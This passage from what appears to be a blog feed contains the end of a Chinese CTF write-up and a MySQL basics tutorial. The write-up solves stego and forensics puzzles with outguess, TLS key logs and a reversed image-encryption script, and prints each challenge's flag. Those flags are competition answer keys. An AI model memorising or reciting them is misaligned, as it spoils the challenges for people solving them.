4</span><br><span class="line">每个小c孩的          c</span><br><span class="line">和一个3岁的          3</span><br><span class="line">予理会3岁大          3</span><br><span class="line">能成为t进行          t</span><br><span class="line">”：在4岁时          4</span><br><span class="line">个体心u理学          u</span><br><span class="line">的决定r并决          r</span><br><span class="line">只承担5年的          5</span><br><span class="line">“记得3岁时          3</span><br><span class="line">有一个4岁的          4</span><br><span class="line">利喂了7个月          7</span><br><span class="line">了直到3岁他          3</span><br><span class="line">是家里7个孩          7</span><br><span class="line">弟小时3候学          3</span><br><span class="line">是相差3年左          3</span><br><span class="line">右一个3岁的          3</span><br><span class="line">已经有8年之          8</span><br><span class="line">续说了8天而          8</span><br><span class="line">婚姻问&#125;题中          &#125;</span><br><span class="line">清楚到5岁时          5</span><br><span class="line">埃莉诺T格卢          T</span><br><span class="line">只给我5毛钱          5</span><br><span class="line">周只有5毛钱          5</span><br><span class="line">上一周5毛钱          5</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;h1d3_1n_th3_p1ctur3&#125;</span><br></pre></td></tr></table></figure><h3 id="迷失幻境"><a href="#迷失幻境" class="headerlink" title="迷失幻境"></a>迷失幻境</h3><p>FTK挂载之后使用diskgenius查看是一堆图片和一个可莉，同时在回收站中找到被删除的45，发现45文件头被破坏，修复文件头之后</p><p>跟任意一张环境Stegsolve合并之后得到key:可莉前来报道</p><p>回收站中还找到另一个图片，使用outguess 隐写得到flag，需要注意outguess执行的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k 可莉前来报道 -r RE4UUGI.jpg flag.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;f473a6fd2de17a0c5794414b3905ebbe&#125;</span><br></pre></td></tr></table></figure><h3 id="躲猫猫"><a href="#躲猫猫" class="headerlink" title="躲猫猫"></a>躲猫猫</h3><p>流量分析得到一个zip，根据这个zip可以分离出key.log和加密脚本，其中的key.log可以用来解密流量包中的tls流量，根据解密后的流量包可以得到一个jpg图片，图片中就是zip的密码，解压得到加密脚本，根据加密脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">from numpy import array, zeros, uint8</span><br><span class="line">import cv2</span><br><span class="line">from secret import get_x_y</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">image = cv2.imread(&quot;cat.png&quot;)</span><br><span class="line">img_gray = cv2.cvtColor(image,cv2.COLOR_RGB2GRAY)</span><br><span class="line">imagearray = array(img_gray)</span><br><span class="line">h = len(imagearray)</span><br><span class="line">w = len(imagearray[0])</span><br><span class="line">x, y = get_x_y()</span><br><span class="line">#5999540678407978169965856946811257903979429787575580150595711549672916183293763090704344230372835328</span><br><span class="line">#6310149030391323406342737832910952782997118359318834776480172449836047279615976753524231989362688</span><br><span class="line">cmd = &quot;echo &#x27;%s\n%s&#x27; &gt; secret&quot; % (x, y)</span><br><span class="line">os.system(cmd)</span><br><span class="line"></span><br><span class="line">x1 = round(x/y*0.001, 16)</span><br><span class="line">u1 = y*3650/x</span><br><span class="line">x2 = round(x/y*0.00101, 16)</span><br><span class="line">u2 = y*3675/x</span><br><span class="line">x3 = round(x/y*0.00102, 16)</span><br><span class="line">u3 = y*3680/x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line"></span><br><span class="line">temp_image = zeros(shape=[h, w, 3], dtype=uint8)</span><br><span class="line">print(len(temp_image))</span><br><span class="line">print(len(temp_image[0]))</span><br><span class="line">print(len(temp_image[0][1]))</span><br><span class="line">for k in range(0, 1):</span><br><span class="line">    for i in range(0, h):</span><br><span class="line">        for j in range(0, w):</span><br><span class="line">            x1 = u1 * x1 * (1 - x1)</span><br><span class="line">            x2 = u2 * x2 * (1 - x2)</span><br><span class="line">            x3 = u3 * x3 * (1 - x3)</span><br><span class="line">            r1 = int(x1*255)</span><br><span class="line">            r2 = int(x2*255)</span><br><span class="line">            r3 = int(x3*255)</span><br><span class="line">            for t in range(0, 3):</span><br><span class="line">                temp_image[i][j][t] = (((r1+r2) ^ r3)+imagearray[i][j][t]) % 256</span><br><span class="line">    x1 = kt[0]</span><br><span class="line">    x2 = kt[1]</span><br><span class="line">    x3 = kt[2]</span><br><span class="line"></span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br><span class="line">encflagarray.save(&quot;missing_cat.png&quot;)</span><br></pre></td></tr></table></figure><p><img src="./image/media/2022/ctf/2022.09/img/png.png"></p><p>然后根据加密脚本逆向得到解密脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as np</span><br><span class="line">from numpy import array, zeros, uint8</span><br><span class="line">import cv2</span><br><span class="line"></span><br><span class="line">image = Image.open(&quot;png.png&quot;)</span><br><span class="line">re_img = np.asarray(image)</span><br><span class="line">x = 5999540678407978169965856946811257903979429787575580150595711549672916183293763090704344230372835328</span><br><span class="line">y = 6310149030391323406342737832910952782997118359318834776480172449836047279615976753524231989362688</span><br><span class="line">x1 = round(x / y * 0.001, 16)</span><br><span class="line">u1 = y * 3650 / x</span><br><span class="line">x2 = round(x / y * 0.00101, 16)</span><br><span class="line">u2 = y * 3675 / x</span><br><span class="line">x3 = round(x / y * 0.00102, 16)</span><br><span class="line">u3 = y * 3680 / x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line">temp_image = zeros(shape=[1800, 1800, 3], dtype=uint8)</span><br><span class="line">print(type(temp_image))</span><br><span class="line">for i in range(0, 1800):</span><br><span class="line">    for j in range(0, 1800):</span><br><span class="line">        x1 = u1 * x1 * (1 - x1)</span><br><span class="line">        x2 = u2 * x2 * (1 - x2)</span><br><span class="line">        x3 = u3 * x3 * (1 - x3)</span><br><span class="line">        r1 = int(x1 * 255)</span><br><span class="line">        r2 = int(x2 * 255)</span><br><span class="line">        r3 = int(x3 * 255)</span><br><span class="line">        for t in range(0, 3):</span><br><span class="line">            temp_image[i][j][t] = (re_img[i][j][t] - ((r1 + r2) ^ r3)) % 256</span><br><span class="line">            # print(temp_image[i][j][t]-((r1+r2) ^ r3))</span><br><span class="line">            # print((temp_image[i][j][t]-((r1+r2) ^ r3))%256)</span><br><span class="line"># img_gray = cv2.cvtColor(image,cv2.COLOR_RGB2GRAY)</span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br><span class="line">encflagarray.save(&quot;missing_cat.png&quot;)</span><br></pre></td></tr></table></figure><p>得到图片</p><p><img src="/image/media/2022/ctf/2022.09/img/cat.png"></p><p>可以看到类似是MAxicode，把中间的猫换成圆圈之后得到</p><p><img src="/image/media/2022/ctf/2022.09/img/flag.png"></p><p>手机扫码得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GWHT&#123;ozqgVLoI1DvK8giNVdvGslr_aZKKwNuv_q-FzqB5N3hHHqn3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySql数据库基础</title>
      <link href="/article/2022-09-26-MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
      <url>/article/2022-09-26-MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>主要记录学习mysql的一些常用的命令。</p><span id="more"></span><h1 id="数据库基础命令"><a href="#数据库基础命令" class="headerlink" title="数据库基础命令"></a>数据库基础命令</h1><h2 id="查询当前所有的数据库"><a href="#查询当前所有的数据库" class="headerlink" title="查询当前所有的数据库"></a>查询当前所有的数据库</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure><h2 id="创建一个数据库"><a href="#创建一个数据库" class="headerlink" title="创建一个数据库"></a>创建一个数据库</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE <span class="operator">&lt;</span>数据库名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>由于创建数据库时没有指定编码表，因此会使用安装数据库时默认的编码表。</p></blockquote><h2 id="创建创建一个数据库并指定字符集"><a href="#创建创建一个数据库并指定字符集" class="headerlink" title="创建创建一个数据库并指定字符集"></a>创建创建一个数据库并指定字符集</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database mydb2 <span class="type">character</span> <span class="keyword">set</span> utf8；</span><br></pre></td></tr></table></figure><h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> database <span class="operator">&lt;</span>数据库名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure><h2 id="修改数据库编码集"><a href="#修改数据库编码集" class="headerlink" title="修改数据库编码集"></a>修改数据库编码集</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> database 数据库名称 <span class="type">character</span> <span class="keyword">set</span> 字符集;</span><br></pre></td></tr></table></figure><h2 id="查看正在使用的数据库"><a href="#查看正在使用的数据库" class="headerlink" title="查看正在使用的数据库"></a>查看正在使用的数据库</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br></pre></td></tr></table></figure><h2 id="切换数据库"><a href="#切换数据库" class="headerlink" title="切换数据库"></a>切换数据库</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 数据库名;</span><br></pre></td></tr></table></figure><h1 id="数据库表结构的CRUD"><a href="#数据库表结构的CRUD" class="headerlink" title="数据库表结构的CRUD"></a>数据库表结构的CRUD</h1><ul><li>新增数据</li><li>修改数据</li><li>删除数据</li><li>查询数据</li></ul><h2 id="单表部分："><a href="#单表部分：" class="headerlink" title="单表部分："></a>单表部分：</h2><h3 id="创建数据库表"><a href="#创建数据库表" class="headerlink" title="创建数据库表"></a>创建数据库表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">  列名 类型(长度),  <span class="comment">-- 某一列,存放的数据是什么类型.长度表示允许列名存储数据的最大长度.</span></span><br><span class="line">  列名 类型(长度),</span><br><span class="line">  …</span><br><span class="line">  列名 类型(长度)   <span class="comment">-- 最后一个列不需要逗号。</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ol><li><strong>一个数据表可以存在很多列（字段），每列具有类型和长度。</strong></li><li><strong>多个列之间使用逗号隔开，最后一个列不需要输入逗号。</strong></li><li><strong>创建表的时候，一定切换到某一个具体的数据库。</strong></li></ol><p>数据类型：</p><ul><li>Varchar – 字符串</li><li>Double – 小数</li><li>Int – 整数</li><li>Date – 日期</li></ul><p>字符类型：（sql 中没有 字符与字符串的区别）</p><ul><li><p>varchar(列的长度)：列的长度可变。</p><blockquote><p>name varchar(10):设置name字段的长度为10,name的储存长度在10以内都可以，并且会自动适应长短。</p><p>补充：保存字符个数：0-255.</p></blockquote></li><li><p>char(列的长度)：列的长度固定，不能改变。 手机号 身份证号 存储固定长度</p><blockquote><p>name char(10):设置name字段的长度为10，name的存储长度在10以内，如果不满10，用空格补足。</p></blockquote></li></ul><h3 id="查看表"><a href="#查看表" class="headerlink" title="查看表"></a>查看表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables  <span class="comment">-- 查看该数据库的所有的表</span></span><br><span class="line"><span class="keyword">desc</span> 表名  <span class="comment">-- 查看表的列的信息（查看表结构）(describe缩写)</span></span><br></pre></td></tr></table></figure><h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> 表名；</span><br></pre></td></tr></table></figure><h3 id="单表创建时约束"><a href="#单表创建时约束" class="headerlink" title="单表创建时约束"></a>单表创建时约束</h3><p>约束语法：<strong>列名 数据类型 约束条件</strong></p><ol><li>主键约束：primary key – 非空 唯一</li><li>唯一约束：unique</li><li>非空约束：not null 表示该字段的值不能为空<h3 id="数据表结构修改"><a href="#数据表结构修改" class="headerlink" title="数据表结构修改"></a>数据表结构修改</h3>修改数据表：可以对表名、表中的列名、列的类型等进行增删改。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 增<span class="operator">/</span>删<span class="operator">/</span>改 列名<span class="operator">*</span>类型(长度) 约束；</span><br></pre></td></tr></table></figure><h4 id="增加列"><a href="#增加列" class="headerlink" title="增加列"></a>增加列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> 列名 类型(长度) 约束;</span><br></pre></td></tr></table></figure><blockquote><p>例如：修改birthday列不能为null。</p><p>alter table emp2 modify birthday date not null;</p></blockquote></li></ol><h4 id="修改现有列类型、长度和约束"><a href="#修改现有列类型、长度和约束" class="headerlink" title="修改现有列类型、长度和约束"></a>修改现有列类型、长度和约束</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 modify 列名 类型(长度) 约束;</span><br></pre></td></tr></table></figure><blockquote><p>例如：修改name列的长度为60。</p><p>alter table emp2 modify name varchar(60) unique not null;</p></blockquote><h4 id="修改现有列的名称"><a href="#修改现有列的名称" class="headerlink" title="修改现有列的名称"></a>修改现有列的名称</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 change 旧列名 新列名 类型(长度) 约束;</span><br></pre></td></tr></table></figure><blockquote><p>例如：修改列名name变为username。</p><p>alter table emp2 change name username varchar(60) unique not null;</p></blockquote><h4 id="删除现有列"><a href="#删除现有列" class="headerlink" title="删除现有列"></a>删除现有列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> 列名;</span><br></pre></td></tr></table></figure><h4 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> 旧表名 <span class="keyword">to</span> 新表名;</span><br></pre></td></tr></table></figure><h4 id="修改表的字符集"><a href="#修改表的字符集" class="headerlink" title="修改表的字符集"></a>修改表的字符集</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="type">character</span> <span class="keyword">set</span> 编码集;</span><br></pre></td></tr></table></figure><blockquote><p>例如： 将emp的编码修改成utf8。</p><p>第一步：查询此时表的编码：show create table emp;</p><p>第二步：将emp的编码修改成utf8：alter table emp character set utf8;</p></blockquote><h3 id="简单数据表内容的增删改"><a href="#简单数据表内容的增删改" class="headerlink" title="简单数据表内容的增删改"></a>简单数据表内容的增删改</h3><h4 id="insert语句"><a href="#insert语句" class="headerlink" title="insert语句"></a>insert语句</h4><ul><li>向数据表插入数据</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 方式一：全写（根据列名插入对应的值）</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名(列名，列名，列名...) <span class="keyword">values</span>（值，值，值...）</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 方式二：省略部分列（省略列名直接插入所有的列）</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 <span class="keyword">values</span>（值，值，值...）</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 方式三：一次性插入多行数据（常用）</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 <span class="keyword">values</span>（值，值，值，值）,（值，值，值，值）...；</span><br></pre></td></tr></table></figure><h4 id="update语句"><a href="#update语句" class="headerlink" title="update语句"></a>update语句</h4><ul><li>数据记录修改操作</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> 列名<span class="operator">=</span>值，列名<span class="operator">=</span>值...[<span class="keyword">where</span>条件语句]；</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><p>（1）如果不加条件语句，将会修改某一列的所有值。</p><p>（2）一般修改数据时，都需要增加条件。</p><blockquote><p>例如：把id为 3 的用户的username和password修改为 zhaoliu。</p><p>修改语句：update person set username=’zhaoliu’, password=’zhaoliu’ where id=3;</p></blockquote><h4 id="delete语句"><a href="#delete语句" class="headerlink" title="delete语句"></a>delete语句</h4><ul><li>删除表中数据的语句</li></ul><p>语法：delete from 表名 [where条件语句]</p><p>注意：</p><p>1）如果删除表中的记录时，没有添加where条件，这时会把表中的所有数据删除。表依然存在，是空的表。</p><p>2）delete是删除行的数据。</p><blockquote><p>例如：删除person表中username为zhaoliu的用户记录。</p><p>删除语句： delete from person where username=‘zhaoliu’;</p></blockquote><blockquote><p>例如：删除表中所有记录。</p><p>删除语句：delete from person;</p></blockquote><h4 id="truncate-语句"><a href="#truncate-语句" class="headerlink" title="truncate 语句"></a>truncate 语句</h4><ul><li>删除数据</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 语法1：</span></span><br><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> 表名；</span><br><span class="line"><span class="comment">-- 语法2：</span></span><br><span class="line"><span class="keyword">truncate</span> 表名；</span><br></pre></td></tr></table></figure><blockquote><p>执行顺序：先删除表,再创建表，就等于将数据全部删除了。</p><p>也就是说上述语句执行时会把表的所有内容都删除掉，然后在创建一个新的表。</p></blockquote><p>truncate 缺点：不能有条件的删除。不能恢复数据</p><p>delete 是逐行删除，并没有恢复初始化值。 可以恢复数据</p><p><strong>truncate 和delete区别</strong></p><ul><li>delete：属于DML语言，它是逐条删除的，并没有恢复初始化值，速度慢一些，删除的数据还<strong>可以恢复</strong>过来。后面可以加where 进行<strong>有条件的删除</strong>。</li><li>truncate：属于DDL语言，删除的数据<strong>不可恢复</strong>，删除速度比delete快，先将整个表删除，再重新创建表。<strong>不能有条件的删除</strong>。<h3 id="数据表记录的查询"><a href="#数据表记录的查询" class="headerlink" title="数据表记录的查询"></a>数据表记录的查询</h3><h4 id="查询数据库中表的所有数据"><a href="#查询数据库中表的所有数据" class="headerlink" title="查询数据库中表的所有数据"></a>查询数据库中表的所有数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure><h4 id="查询某张表中指定的列"><a href="#查询某张表中指定的列" class="headerlink" title="查询某张表中指定的列"></a>查询某张表中指定的列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 列名,列名... <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure><h4 id="按条件查询"><a href="#按条件查询" class="headerlink" title="按条件查询"></a>按条件查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 列名,列名... <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件;</span><br></pre></td></tr></table></figure><h4 id="查询时使用的运算符"><a href="#查询时使用的运算符" class="headerlink" title="查询时使用的运算符"></a>查询时使用的运算符</h4></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. &gt;(大于) 、&lt;(小于) 、&gt;=(大于等于) 、&lt;=(小于等于) 、=(相等) 、&lt;&gt;或!=(不相等)</span><br><span class="line">2. 与 或 非</span><br><span class="line">   - and：逻辑与，多个条件同时成立。&amp;&amp;</span><br><span class="line">   - or：逻辑或，多个条件任意一个成立。||</span><br><span class="line">   - not：逻辑非，相反的意思。!</span><br><span class="line">3. 区间：between … and … 在两者之间取值。</span><br><span class="line">   格式：列名 **between **开始值 **and **结束值;</span><br><span class="line">4. in(值1,值2,值3) 在指定值中任意取。</span><br><span class="line">5. 模糊查询：like ‘模糊查询部分’</span><br><span class="line">6. 表达式有两个占位符：</span><br><span class="line">   %表示零或任意多个字符;</span><br><span class="line">   _任意单个字符;</span><br><span class="line">7. is null：判断该值是否为空</span><br><span class="line">8. 判断不是空：is not null</span><br></pre></td></tr></table></figure><h4 id="过滤重复数据"><a href="#过滤重复数据" class="headerlink" title="过滤重复数据"></a>过滤重复数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询排重：</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> 列名,列名... <span class="keyword">from</span> 表名[<span class="keyword">where</span> 条件];</span><br></pre></td></tr></table></figure><blockquote><p>说明：distinct： 去重复。显示distinct后面列的内容，并且过滤掉重复的数据。</p></blockquote><h4 id="对查询结果进行排序"><a href="#对查询结果进行排序" class="headerlink" title="对查询结果进行排序"></a>对查询结果进行排序</h4><p>使用order by 子句排序查询结果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span> 列名<span class="number">1</span> <span class="keyword">asc</span><span class="operator">|</span><span class="keyword">desc</span>，列名<span class="number">2</span>(<span class="keyword">asc</span> <span class="operator">|</span> <span class="keyword">desc</span>)...</span><br></pre></td></tr></table></figure><p>按照列名1，列名2，列名3 进行排序输出。asc是升序排列，desc是降序排列。默认是asc升序。</p><h4 id="别名：可以对查询出来的列名起别名"><a href="#别名：可以对查询出来的列名起别名" class="headerlink" title="别名：可以对查询出来的列名起别名"></a>别名：可以对查询出来的列名起别名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 列名 <span class="keyword">as</span> 别名,列名 <span class="keyword">as</span> 别名... <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件;</span><br></pre></td></tr></table></figure><p>注意：在使用别名的时候，as关键字可以忽略。</p><h3 id="SQL中的聚合函数"><a href="#SQL中的聚合函数" class="headerlink" title="SQL中的聚合函数"></a>SQL中的聚合函数</h3><p>聚合函数(聚集函数)：多个数据进行运算，运算出一个结果。例如，求记录数，求和，平均值，最大值，最小值。</p><ul><li>count(数目) : 统计<strong>个数（行数）</strong>,统计有多少行，或者有多少条数据。</li><li>sum(和)函数：求和。</li><li>avg(均值)函数：求平均值。</li><li>max(最大值)：求最大值。</li><li>min(最小值)：求最小值。<h4 id="count函数"><a href="#count函数" class="headerlink" title="count函数"></a>count函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) 或 <span class="built_in">count</span>(具体列名) <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure><blockquote><p>注意：count列统计时，不会统计null</p></blockquote></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(列名) <span class="keyword">from</span> 表名;  <span class="comment">-- 按具体的列来进行统计行数</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> 表名;   <span class="comment">-- 统计表中的行数</span></span><br></pre></td></tr></table></figure><h4 id="sum函数"><a href="#sum函数" class="headerlink" title="sum函数"></a>sum函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(列名),<span class="built_in">sum</span>(列名)... <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure><p><strong>注意：使用sum 多列进行求和的时候，如果某一列中含有null，这一列所在的行中的其他数据不会被加到总和中。</strong></p><p>ifnull(列名, 默认值)函数表示判断该列名是否为null,如果为null，返回默认值，如果不为null，返回实际的值。</p><p>数据库中的函数：truncate(列名, 截取的小数位) 表示截取的意思，保留几位小数。</p><h4 id="avg函数"><a href="#avg函数" class="headerlink" title="avg函数"></a>avg函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(列名) <span class="keyword">from</span> 表名；</span><br></pre></td></tr></table></figure><p><strong>注意：求某列的平均值，avg里面的null不作为统计</strong></p><h4 id="max-min函数"><a href="#max-min函数" class="headerlink" title="max/min函数"></a>max/min函数</h4><p>max函数：求最大值；min函数：求最小值；max(列) /min(列) 统计该列的最大值或者最小值。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(列名),<span class="built_in">min</span>(列名) <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure><p><strong>注意：null 排除在外</strong></p><h3 id="分组查询group-by"><a href="#分组查询group-by" class="headerlink" title="分组查询group by"></a>分组查询group by</h3><h4 id="group-by-分组函数"><a href="#group-by-分组函数" class="headerlink" title="group by 分组函数"></a>group by 分组函数</h4><p>分组：按照某一列或者某几列，把相同的数据进行合并输出。</p><figure class="highlight sql"><table><tr><td 